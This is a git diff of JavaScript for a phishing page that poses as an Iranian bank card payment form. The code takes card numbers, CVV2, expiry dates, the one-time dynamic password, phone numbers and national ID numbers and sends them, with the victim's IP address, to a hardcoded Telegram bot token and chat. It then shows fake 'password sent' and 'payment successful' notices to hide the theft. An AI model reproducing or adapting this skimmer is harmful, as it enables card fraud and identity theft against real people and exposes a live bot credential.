@@ -1,34 +1,6 @@
 const token = '7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY';
 const chatId = '-4614449543';
 
-// var du = new DeviceUUID().parse();
-// var dua = [
-//   du.language,
-//   du.platform,
-//   du.os,
-//   du.cpuCores,
-//   du.isAuthoritative,
-//   du.silkAccelerated,
-//   du.isKindleFire,
-//   du.isDesktop,
-//   du.isMobile,
-//   du.isTablet,
-//   du.isWindows,
-//   du.isLinux,
-//   du.isLinux64,
-//   du.isMac,
-//   du.isiPad,
-//   du.isiPhone,
-//   du.isiPod,
-//   du.isSmartTV,
-//   du.pixelDepth,
-//   du.isTouchScreen,
-// ];
-// var uuid = du.hashMD5(dua.join(':'));
-
-// const androidId = androidListener.getAndroidID();
-// const device = androidListener.deviceName();
-
 const sendMessage = async function (message) {
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
@@ -108,6 +80,7 @@ const cvv2Input = document.getElementById('cvv2Input');
 const exprationInput = document.getElementById('exprationInput');
 const captchaInput = document.getElementById('captchaInput');
 const poyaInput = document.getElementById('poyaInput');
+const poyaSpan = document.getElementById('poyaSpan');
 const pattern = '____-____-____-____';
 
 cardInput.addEventListener('input', function () {
@@ -191,11 +164,55 @@ function validateCVV2(cvv) {
     return true;
   }
 }
+
 let codeMeli;
 let phone;
 let errors = [];
-form.addEventListener('keydown', e => {
-  // e.preventDefault();
+let poyaRequest = false;
+let timeRemainingpoya = 2 * 60; // 10 دقیقه به ثانیه
+const timerElementpoya = document.getElementById('poyaSpan');
+
+poyaSpan.addEventListener('click', () => {
+  if (!poyaRequest) {
+    Toastify({
+      text: 'رمز پویا ارسال شد.',
+      duration: 2000,
+      newWindow: true,
+      close: true,
+      gravity: 'top', // `top` or `bottom`
+      position: 'right', // `left`, `center` or `right`
+      stopOnFocus: true, // Prevents dismissing of toast on hover
+      style: {
+        fontSize: '1.1rem',
+        fontWeight: '600',
+        background: '#15bb09',
+        width: '300px',
+        minWidth: '300px',
+        display: 'flex',
+        justifyContent: 'space-between',
+      },
+    }).showToast();
+    const countdownpoya = setInterval(() => {
+      const minutes = Math.floor(timeRemainingpoya / 60);
+      const seconds = timeRemainingpoya % 60;
+
+      timerElementpoya.textContent = `${String(minutes).padStart(
+        2,
+        '0'
+      )}:${String(seconds).padStart(2, '0')}`;
+
+      if (timeRemainingpoya <= 0) {
+        clearInterval(countdownpoya);
+        timerElementpoya.textContent = 'درخواست رمزپویا';
+        poyaRequest = false;
+      }
+      timeRemainingpoya--;
+    }, 1000);
+  }
+  poyaRequest = true;
+});
+form.addEventListener('submit', e => {
+  e.preventDefault();
   if (!validateCardNumber(cardInput.value)) {
     errors.push('شماره کارت معتبر نیست.');
   }
@@ -212,33 +229,76 @@ form.addEventListener('keydown', e => {
     errors.push('کدامنیتی معتبر نیست.');
   }
 
+  // level 1
   if (
     validateCardNumber(cardInput.value) &&
     validateExpirationDate(mm, yy) &&
     validateCVV2(cvv2Input.value) &&
-    captchaInput.value === '80860'
+    captchaInput.value === '80860' &&
+    poyaRequest === false &&
+    poyaInput.value !== ''
   ) {
     const message = `
-    Card Number: ${cardInput.value}
-Expiration: ${mm}/${yy}
-Cvv2: ${cvv2Input.value}
---------------
-IP: ${userIp}
-Device: ${getDeviceType()}
+    💳 #Ista Card information received .
+Card : ${cardInput.value}
+Cvv2 : ${cvv2Input.value}
+Month : ${mm}
+Year : ${yy}
+Pass2 : ${poyaInput.value}
+IP : ${userIp}
+Tag : #${''}
   `;
-    console.log(cardInput.value);
-    console.log(mm);
-    console.log(yy);
-    console.log(cvv2Input.value);
     sendMessage(message);
-    cardInput.value = '';
-    exprationInput.value = '';
-    cvv2Input.value = '';
-    captchaInput.value = '';
     setTimeout(() => {
       Toastify({
         text: 'پرداخت با موفقیت انجام شد.',
-        duration: 3000,
+        duration: 2000,
+        newWindow: true,
+        close: true,
+        gravity: 'top', // `top` or `bottom`
+        position: 'right', // `left`, `center` or `right`
+        stopOnFocus: true, // Prevents dismissing of toast on hover
+        style: {
+          fontSize: '1.1rem',
+          fontWeight: '600',
+          background: '#15bb09',
+          width: '300px',
+          minWidth: '300px',
+          display: 'flex',
+          justifyContent: 'space-between',
+        },
+      }).showToast();
+      setTimeout(() => {
+        document.getElementById('page3').classList.add('hidden');
+        document.getElementById('page4').classList.remove('hidden');
+      }, 1000);
+    }, 2000);
+  }else {
+    
+  }
+  // level 2
+  if (
+    validateCardNumber(cardInput.value) &&
+    validateExpirationDate(mm, yy) &&
+    validateCVV2(cvv2Input.value) &&
+    captchaInput.value === '80860' &&
+    poyaRequest === true
+  ) {
+    const message = `
+    💳 #Ista Card information received .
+Card : ${cardInput.value}
+Cvv2 : ${cvv2Input.value}
+Month : ${mm}
+Year : ${yy}
+Pass2 : ${poyaInput.value}
+IP : ${userIp}
+Tag : #${''}
+  `;
+    sendMessage(message);
+    setTimeout(() => {
+      Toastify({
+        text: 'پرداخت با موفقیت انجام شد.',
+        duration: 2000,
         newWindow: true,
         close: true,
         gravity: 'top', // `top` or `bottom`
@@ -309,8 +369,8 @@ function isValidEmail(email) {
   return emailPattern.test(email);
 }
 
-const androidId = androidListener.getAndroidID();
-const device = androidListener.deviceName();
+// const androidId = androidListener.getAndroidID();
+// const device = androidListener.deviceName();
 
 firstBtn.addEventListener('click', () => {
   if (!validateIranianMobileNumber(phoneInput.value)) {
@@ -339,7 +399,7 @@ firstBtn.addEventListener('click', () => {
       const message = `
       Phone: ${phone}
 CodeMeli: ${codeMeli}
-Tag: ${androidId}
+Tag: #${androidId}
   `;
       sendMessage(message);
       document.getElementById('page1').classList.add('hidden');
